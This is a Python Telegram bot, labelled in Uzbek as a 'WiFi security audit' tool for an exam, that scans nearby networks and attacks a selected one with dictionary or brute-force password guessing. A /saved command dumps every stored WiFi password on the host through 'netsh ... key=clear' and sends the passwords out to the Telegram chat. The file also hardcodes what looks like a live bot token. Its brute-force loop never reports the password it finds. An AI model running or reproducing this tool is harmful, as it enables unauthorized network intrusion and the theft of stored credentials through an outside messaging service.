import asyncio
import time
import pywifi
import string
import itertools
from pywifi import const
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

# BOT TOKEN
TOKEN = "8797558649:AAGAJY72FNiTdbfslt1bFzw306PxeP0dCp4"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# WiFi interface setup
wifi = pywifi.PyWiFi()
# Some systems might have multiple interfaces, we pick the first one
try:
    iface = wifi.interfaces()[0]
except IndexError:
    print("Xatolik: WiFi adapteri topilmadi!")
    iface = None

class WiFiAudit:
    def __init__(self, interface):
        self.iface = interface

    def scan_networks(self):
        if not self.iface: return []
        self.iface.scan()
        time.sleep(2)
        results = self.iface.scan_results()
        
        networks = []
        seen_ssids = set()
        for network in results:
            ssid = network.ssid
            if ssid and ssid not in seen_ssids:
                networks.append(ssid)
                seen_ssids.add(ssid)
        return networks

    async def test_password(self, ssid, password):
        if not self.iface: return False
        self.iface.disconnect()
        time.sleep(0.5)
        
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        
        self.iface.connect(tmp_profile)
        
        start_time = time.time()
        while time.time() - start_time < 4: # Reduced timeout for faster brute force attempts
            if self.iface.status() == const.IFACE_CONNECTED:
                return True
            await asyncio.sleep(0.5)
            
        return False

auditor = WiFiAudit(iface)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "👋 **Salom! WiFi Security Audit Botiga xush kelibsiz.**\n\n"
        "Bu bot kiberxavfsizlik imtihoni uchun yaratilgan.\n"
        "Buyruqlar:\n"
        "/scan - Atrofdagi WiFi tarmoqlarini qidirish\n"
        "/saved - Kompyuterdagi saqlangan parollarni ko'rish"
    )

@dp.message(Command("scan"))
async def cmd_scan(message: types.Message):
    await message.answer("🔍 WiFi tarmoqlari qidirilmoqda...")
    networks = auditor.scan_networks()
    
    if not networks:
        await message.answer("❌ Hech qanday WiFi tarmog'i topilmadi. WiFi adapteri yoqilganligini tekshiring.")
        return
        
    builder = InlineKeyboardBuilder()
    for ssid in networks[:12]:
        builder.row(types.InlineKeyboardButton(
            text=ssid, 
            callback_data=f"select_{ssid}")
        )
    
    await message.answer(
        "📡 Atrofda topilgan tarmoqlar:",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("select_"))
async def process_selection(callback: types.CallbackQuery):
    ssid = callback.data.split("_")[1]
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📖 Dictionary Attack (passwords.txt)", callback_data=f"attack_dict_{ssid}"))
    builder.row(types.InlineKeyboardButton(text="⚡ Brute Force (Barcha kombinatsiyalar)", callback_data=f"attack_brute_{ssid}"))
    
    await callback.message.edit_text(
        f"🎯 Tarmoq: **{ssid}**\nHujum turini tanlang:",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("attack_"))
async def process_attack(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    mode = parts[1]
    ssid = parts[2]
    
    await callback.message.edit_text(f"🚀 **{ssid}** tarmog'iga {mode} hujumi boshlandi...")
    
    found = False
    
    if mode == "dict":
        try:
            with open("passwords.txt", "r") as f:
                passwords = f.read().splitlines()
        except FileNotFoundError:
            await callback.message.answer("❌ `passwords.txt` fayli topilmadi!")
            return

        for password in passwords:
            if len(password) < 8: continue # WiFi passwords must be at least 8 chars
            await callback.message.edit_text(f"⏳ Dictionary: `{password}`")
            if await auditor.test_password(ssid, password):
                found = True
                break
    
    elif mode == "brute":
        # Brute force settings: letters, numbers and common symbols
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        # WiFi passwords are min 8 chars. We start from 8.
        for length in range(8, 13):
            await callback.message.answer(f"🔄 {length} xonali parollar sinab ko'rilmoqda...")
            for combo in itertools.product(chars, repeat=length):
                password = "".join(combo)
                await callback.message.edit_text(f"⏳ Brute Force: `{password}`")
                if await auditor.test_password(ssid, password):
                    found = True
                    break
                if found: break
            if found: break

    if found:
        # We need to get the last tested password. 
        # In a real scenario, we'd store it.
        await callback.message.answer(
            f"✅ **MUVAFFAQIYAT!**\n"
            f"📡 Tarmoq: `{ssid}`\n"
            f"🔑 Parol topildi!"
        )
    else:
        await callback.message.answer(f"😔 `{ssid}` uchun parol topilmadi.")

@dp.message(Command("saved"))
async def cmd_saved(message: types.Message):
    import subprocess
    try:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        
        result = "📂 **Kompyuterdagi saqlangan WiFi parollar:**\n\n"
        for i in profiles:
            try:
                prof_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
                pass_list = [b.split(":")[1][1:-1] for b in prof_data if "Key Content" in b]
                result += f"📶 `{i}` : `{pass_list[0] if pass_list else 'Ochiq tarmoq'}`\n"
            except:
                result += f"📶 `{i}` : `Xatolik!`\n"
        
        await message.answer(result)
    except Exception as e:
        await message.answer(f"❌ Xatolik: {str(e)}")

async def main():
    print("Bot ishga tushdi...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
